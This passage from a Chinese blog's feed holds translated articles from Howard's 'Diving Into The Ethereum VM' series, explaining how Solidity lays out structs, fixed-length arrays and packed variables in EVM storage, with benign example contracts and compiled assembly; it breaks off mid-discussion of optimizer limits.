title="Conclusion"></a>Conclusion</h2><p>深入了解 Solidity 编译器的内部工作原理，我们发现熟悉的数据结构（如映射和数组）与传统的编程语言完全不同。</p><p>回顾一下：</p><ul><li>数组就像映射，效率不高。</li><li>比映射更复杂的汇编代码。</li><li>较小类型（byte，uint8，string）比映射有着更高的存储效率。</li><li>汇编没有很好地优化。即使使用打包，每次赋值也有一个 <code>sstore</code>。</li></ul><p>EVM 存储是一个键值对数据库，很像 git。如果你改变任何东西，根节点的校验和就会改变。如果两个根节点的校验和相同，则保证存储的数据相同。</p><p>要了解 Solidity 和 EVM 的奇特之处，请想象数组的每个元素都是 git 仓库中自己的文件。当你改变一个数组元素的值时，你实际上是在创建一个 git commit。当遍历一个数组时，你不能一次加载整个数组，你必须查看仓库并分别找到每个文件。</p><p>不仅如此，每个文件限制为 32 个字节！因为我们需要将数据结构分割成 32 字节的块，Solidity 的编译器由于各种逻辑和优化技巧而变得复杂，所有这些都是在汇编中完成的。</p><p>然而，32 字节的限制完全是任意的。背后的键值存储可以使用键存储任意数量的字节。也许将来我们可以添加一条新的 EVM 指令来使用键存储任意字节。</p><p>目前，EVM 存储是一个装作(pretend) 32 字节数组的键值数据库。</p><blockquote><p>请参阅 <a href="https://github.com/ethereum/solidity/blob/3b07c4d38e40c52ee8a4d16e56e2afa1a0f27905/libsolidity/codegen/ArrayUtils.cpp#L624">ArrayUtils::resizeDynamicArray</a> 以了解编译器在调整数组大小时所做的事情。通常数据结构将作为标准库的一部分在语言中完成，但在 Solidity 中，它被嵌入到编译器中。</p></blockquote><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a><br>也可以直接看总结篇：</li><li><a href="http://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary">深入以太坊虚拟机 总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-Part3-—-动态数据类型的表示&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-Part3-—-动态数据类型的表示&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 Part3 — 动态数据类型的表示&quot;&gt;&lt;/a&gt;深入以太坊虚拟机</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</title>
    <link href="https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/"/>
    <id>https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/</id>
    <published>2022-10-07T08:39:38.000Z</published>
    <updated>2022-10-17T04:06:00.868Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-Part2-—-固定长度数据类型的表示"><a href="#深入以太坊虚拟机-Part2-—-固定长度数据类型的表示" class="headerlink" title="深入以太坊虚拟机 Part2 — 固定长度数据类型的表示"></a>深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</h1><blockquote><p>原文：<a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7">Diving Into The Ethereum VM Part 2 — How I Learned To Start Worrying And Count The Storage Cost | by Howard | Aug 14, 2017 </a></p></blockquote><p>在本系列的第一篇文章中，我们了解了一个简单的 Solidity 合约的汇编代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约归结为调用 <code>sstore</code>​ 指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// a <span class="token operator">=</span> <span class="token number">1</span>sstore<span class="token punctuation">(</span>0x0, 0x1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><ul><li>EVM 将值 <code>0x1</code> 存储在存储(storage)位置 <code>0x0</code>​</li><li>每个存储位置可以存储 32 个字节（或 256 位）</li></ul><blockquote><p>如果看起来不熟悉，建议阅读：<a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a>。</p></blockquote><p>在本文中，我们将开始研究 Solidity 如何使用 32 字节的块(chunks)来表示更复杂的数据类型，比如结构体和数组。我们还将了解如何优化存储，以及优化是如何失败的。</p><p>在典型的编程语言中，理解数据类型如何在如此低的级别表示并不是非常有用。在 Solidity（或任何 EVM 语言）中，这些知识至关重要，因为访问存储非常昂贵：</p><ul><li><code>sstore</code> 花费 20000 gas，或比基本算术指令贵约 5000 倍</li><li><code>sload</code> 需要 200 gas，或比基本算术指令贵 100 倍</li></ul><p>通过“成本”，我们在这里谈论的是 real money，而不仅仅是毫秒级的性能。运行和使用合约的成本很可能由 <code>sstore</code> 和 <code>sload</code> 主导！</p><h2 id="Parsecs-Upon-Parsecs-of-Tape"><a href="#Parsecs-Upon-Parsecs-of-Tape" class="headerlink" title="Parsecs Upon Parsecs of Tape"></a>Parsecs Upon Parsecs of Tape</h2><p>构建通用计算机需要两个基本要素：</p><ol><li>一种循环的方式，跳转(jump)或递归(recursion)</li><li>无限的内存数量</li></ol><p>EVM 汇编代码有跳转，EVM 存储提供无线内存。这对一切都足够了，包括模拟一个运行以太坊版本的世界，它本身也在模拟一个运行以太坊的世界，即…</p><p>合约的 EVM 存储就像一个无限的收报机磁带，磁带的每个插槽(slot)都保存 32 个字节。就像这样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">32</span> bytes<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">32</span> bytes<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">32</span> bytes<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>我们将看到数据如何存在于无限磁带上。</p><blockquote><p>磁带的长度为 $2^{256}$(32 字节)，或每个合约约 $10^{77}$(和 $2^{256}$ 同量级) 个存储槽。可观测宇宙的粒子数为 $10^{80}$。大约 1000 份合约足以容纳所有这些质子、中子和电子。不要相信营销炒作，因为它比无穷大要短得多。</p></blockquote><h2 id="The-Blank-Tape"><a href="#The-Blank-Tape" class="headerlink" title="The Blank Tape"></a>The Blank Tape</h2><p>存储最初是空白的，默认为 0。拥有无限磁带不会花费您任何费用。</p><p>让我们看一个简单的合约来说明零值行为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-many-variables.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> b<span class="token punctuation">;</span><span class="token builtin">uint256</span> c<span class="token punctuation">;</span><span class="token builtin">uint256</span> d<span class="token punctuation">;</span><span class="token builtin">uint256</span> e<span class="token punctuation">;</span><span class="token builtin">uint256</span> f<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>f <span class="token operator">=</span> <span class="token number">0xc0fefe</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>存储布局很简单。</p><ul><li>变量 <code>a</code> 在位置 <code>0x0</code>​</li><li>变量 <code>b</code> 在位置 <code>0x1</code>​</li><li>依此类推…</li></ul><p>关键问题：如果我们只使用 <code>f</code>，我们要为 a、b、c、d、e 支付多少费用？</p><p>让我们编译看看：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-many-variables.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// sstore<span class="token punctuation">(</span>0x5, 0xc0fefe<span class="token punctuation">)</span>tag_2:  0xc0fefe  0x5  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>因此，存储变量声明不需要任何费用，因为不需要初始化。 Solidity 为该存储变量保留了一个位置，并且您只有在其中存储某些内容时才需要支付费用。</p><p>在这种情况下，我们只需支付存储到 <code>0x5</code> 的费用。</p><p>如果我们手动编写汇编，我们可以选择任何存储位置而无需“扩展”存储：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Writing to an arbitrary positionsstore<span class="token punctuation">(</span>0xc0fefe, 0x42<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h2 id="Reading-Zero"><a href="#Reading-Zero" class="headerlink" title="Reading Zero"></a>Reading Zero</h2><p>您不仅可以在存储中的任何位置写入，还可以立即从任何位置读取。从未初始化的位置读取只会返回 <code>0x0</code>。</p><p>让我们看一个从 <code>a</code> 读取的合约，一个未初始化的位置：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-zero-value.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-zero-value.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // sload<span class="token punctuation">(</span>0x0<span class="token punctuation">)</span> returning 0x0  0x0  dup1  sload  // a + <span class="token number">1</span><span class="token punctuation">;</span> where a <span class="token operator">==</span> <span class="token number">0</span>  0x1  <span class="token function">add</span>  // sstore<span class="token punctuation">(</span>0x0, a + <span class="token number">1</span><span class="token punctuation">)</span>  swap1  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，生成从未初始化位置 <code>sload</code> 的代码是有效的。</p><p>然而，我们可以比 Solidity 编译器更聪明。由于我们知道 <code>tag_2</code> 是构造函数，并且 <code>a</code> 从未被写入，我们可以将 <code>sload</code> 序列替换为 <code>0x0</code> 以节省 5000 gas。</p><h2 id="Representing-Struct"><a href="#Representing-Struct" class="headerlink" title="Representing Struct"></a>Representing Struct</h2><p>让我们看看我们的第一个复杂数据类型，一个有 6 个字段的结构体：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-struct-fields.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">Tuple</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> b<span class="token punctuation">;</span><span class="token builtin">uint256</span> c<span class="token punctuation">;</span><span class="token builtin">uint256</span> d<span class="token punctuation">;</span><span class="token builtin">uint256</span> e<span class="token punctuation">;</span><span class="token builtin">uint256</span> f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Tuple t<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>t<span class="token punctuation">.</span>f <span class="token operator">=</span> <span class="token number">0xC0FEFE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>存储中的布局与状态变量相同：</p><ul><li>字段 <code>t.a</code> 在位置 <code>0x0</code>​</li><li>字段 <code>t.b</code> 在位置 <code>0x1</code>​</li><li>依此类推…</li></ul><p>和前面一样，我们可以直接写入 <code>t.f</code> 而不需要初始化。</p><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-struct-fields.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>我们可以看到完全相同的汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  0xc0fefe  0x5  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Fixed-Length-Array"><a href="#Fixed-Length-Array" class="headerlink" title="Fixed Length Array"></a>Fixed Length Array</h2><p>现在我们声明一个固定长度的数组：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-static-array.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> numbers<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      numbers<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC0FEFE</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>由于编译器确切地知道有多少 uint256（32 字节），它可以简单地将数组的元素一个接一个地放置在存储中，就像它对存储变量和结构体所做的那样。</p><p>在这个合约中，我们再次存储到位置 <code>0x5</code>。</p><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-static-array.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  0xc0fefe  0x0  0x5tag_4:  <span class="token function">add</span>  0x0tag_5:  pop  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>它稍微长一点，但如果你仔细看，你会发现它实际上是一样的。让我们手动进一步优化：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  0xc0fefe  // <span class="token number">0</span>+5. Replace with 0x5  0x0  0x5  <span class="token function">add</span>  // Push <span class="token keyword">then</span> pop immediately. Useless, just remove.  0x0  pop  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>去除标签和虚假指令，我们再次得到相同的字节码序列：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  0xc0fefe  0x5  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Array-Bound-Checking"><a href="#Array-Bound-Checking" class="headerlink" title="Array Bound Checking"></a>Array Bound Checking</h2><p>我们已经看到，定长数组与 struct 和 状态变量具有相同的存储布局，但生成的汇编代码不同。原因是 Solidity 为数组访问生成边界检查。</p><p>让我们再次编译数组合约，这次关闭优化：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm c-static-array.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编代码在下面给出注释，在每条指令后打印机器状态：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  0xc0fefe    <span class="token punctuation">[</span>0xc0fefe<span class="token punctuation">]</span>  0x5    <span class="token punctuation">[</span>0x5 0xc0fefe<span class="token punctuation">]</span>  dup1  /* array bound checking code */  // <span class="token number">5</span> <span class="token operator">&lt;</span> <span class="token number">6</span>  0x6    <span class="token punctuation">[</span>0x6 0x5 0xc0fefe<span class="token punctuation">]</span>  dup2    <span class="token punctuation">[</span>0x5 0x6 0x5 0xc0fefe<span class="token punctuation">]</span>  lt    <span class="token punctuation">[</span>0x1 0x5 0xc0fefe<span class="token punctuation">]</span>  // bound_check_ok <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span>  // if<span class="token punctuation">(</span>bound_check_ok<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> goto tag5 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> invalid <span class="token punctuation">&#125;</span>  tag_5    <span class="token punctuation">[</span>tag_5 0x1 0x5 0xc0fefe<span class="token punctuation">]</span>  jumpi    // Test condition is true. Will goto tag_5.    // And <span class="token variable"><span class="token variable">`</span>jumpi<span class="token variable">`</span></span> consumes two items from stack.    <span class="token punctuation">[</span>0x5 0xc0fefe<span class="token punctuation">]</span>  invalid// Array access is valid. Do it.// stack: <span class="token punctuation">[</span>0x5 0xc0fefe<span class="token punctuation">]</span>tag_5:  sstore    <span class="token punctuation">[</span><span class="token punctuation">]</span>    storage: <span class="token punctuation">&#123;</span> 0x5 <span class="token operator">=</span><span class="token operator">></span> 0xc0fefe <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我们现在看到了边界检查代码。我们已经看到编译器能够优化其中的一些东西，但并不完美。</p><p>在本文后面，我们将看到数组边界检查如何干扰编译器优化，从而使固定长度数组的效率远低于存储变量或结构体。</p><h2 id="Packing-Behaviour"><a href="#Packing-Behaviour" class="headerlink" title="Packing Behaviour"></a>Packing Behaviour</h2><p>存储很昂贵（yayaya，我已经说过一百万次了）。一项关键优化是将尽可能多的数据打包到一个 32 字节的存储槽中。</p><p>考虑一个有四个存储变量的合约，每个变量 64 位，加起来共 256 位（32 字节）：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-many-variables--packing.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint64</span> a<span class="token punctuation">;</span><span class="token builtin">uint64</span> b<span class="token punctuation">;</span><span class="token builtin">uint64</span> c<span class="token punctuation">;</span><span class="token builtin">uint64</span> d<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">0xaaaa</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">0xbbbb</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token number">0xcccc</span><span class="token punctuation">;</span>d <span class="token operator">=</span> <span class="token number">0xdddd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我们希望编译器使用一个 <code>sstore</code> 将它们放在同一个存储槽中。</p><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-many-variables--packing.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:    /* <span class="token string">"c-many-variables--packing.sol"</span>:121:122  a */  0x0    /* <span class="token string">"c-many-variables--packing.sol"</span>:121:131  a <span class="token operator">=</span> 0xaaaa */  dup1  sload    /* <span class="token string">"c-many-variables--packing.sol"</span>:125:131  0xaaaa */  0xaaaa  not<span class="token punctuation">(</span>0xffffffffffffffff<span class="token punctuation">)</span>    /* <span class="token string">"c-many-variables--packing.sol"</span>:121:131  a <span class="token operator">=</span> 0xaaaa */  swap1  swap2  and  or  not<span class="token punctuation">(</span>sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0x80<span class="token punctuation">)</span>, exp<span class="token punctuation">(</span>0x2, 0x40<span class="token punctuation">))</span><span class="token punctuation">)</span>    /* <span class="token string">"c-many-variables--packing.sol"</span>:139:149  b <span class="token operator">=</span> 0xbbbb */  and  0xbbbb0000000000000000  or  not<span class="token punctuation">(</span>sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0xc0<span class="token punctuation">)</span>, exp<span class="token punctuation">(</span>0x2, 0x80<span class="token punctuation">))</span><span class="token punctuation">)</span>    /* <span class="token string">"c-many-variables--packing.sol"</span>:157:167  c <span class="token operator">=</span> 0xcccc */  and  0xcccc00000000000000000000000000000000  or  sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0xc0<span class="token punctuation">)</span>, 0x1<span class="token punctuation">)</span>    /* <span class="token string">"c-many-variables--packing.sol"</span>:175:185  d <span class="token operator">=</span> 0xdddd */  and  0xdddd000000000000000000000000000000000000000000000000  or  swap1  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>有很多我无法破解的位运算，我不关心。需要注意的关键是这里只有一个 <code>sstore</code>。</p><p>优化成功！</p><h2 id="Breaking-The-Optimizer"><a href="#Breaking-The-Optimizer" class="headerlink" title="Breaking The Optimizer"></a>Breaking The Optimizer</h2><p>要是优化器能一直工作得这么好就好了。让我们打破它。我们所做的唯一改变是我们使用辅助函数来设置存储变量：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-many-variables--packing-helpers.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint64</span> a<span class="token punctuation">;</span><span class="token builtin">uint64</span> b<span class="token punctuation">;</span><span class="token builtin">uint64</span> c<span class="token punctuation">;</span><span class="token builtin">uint64</span> d<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">setAB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setCD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">setAB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">0xaaaa</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">0xbbbb</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">setCD</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">&#123;</span>c <span class="token operator">=</span> <span class="token number">0xcccc</span><span class="token punctuation">;</span>d <span class="token operator">=</span> <span class="token number">0xdddd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-many-variables--packing-helpers.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>汇编输出太多。我们将忽略大部分细节并专注于结构：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Constructor <span class="token keyword">function</span>tag_2:  // <span class="token punctuation">..</span>.  // call setAB<span class="token punctuation">(</span><span class="token punctuation">)</span> by jumping to tag_5  jumptag_4:  // <span class="token punctuation">..</span>.  // call setCD<span class="token punctuation">(</span><span class="token punctuation">)</span> by jumping to tag_7  jump// <span class="token keyword">function</span> setAB<span class="token punctuation">(</span><span class="token punctuation">)</span>tag_5:  // Bit-shuffle and <span class="token builtin class-name">set</span> a, b  // <span class="token punctuation">..</span>.  sstoretag_9:  jump  // <span class="token builtin class-name">return</span> to <span class="token builtin class-name">caller</span> of setAB<span class="token punctuation">(</span><span class="token punctuation">)</span>// <span class="token keyword">function</span> setCD<span class="token punctuation">(</span><span class="token punctuation">)</span>tag_7:  // Bit-shuffle and <span class="token builtin class-name">set</span> c, d  // <span class="token punctuation">..</span>.  sstoretag_10:  jump  // <span class="token builtin class-name">return</span> to <span class="token builtin class-name">caller</span> of setCD<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>现在有两个 <code>sstore</code> 而不是一个。Solidity 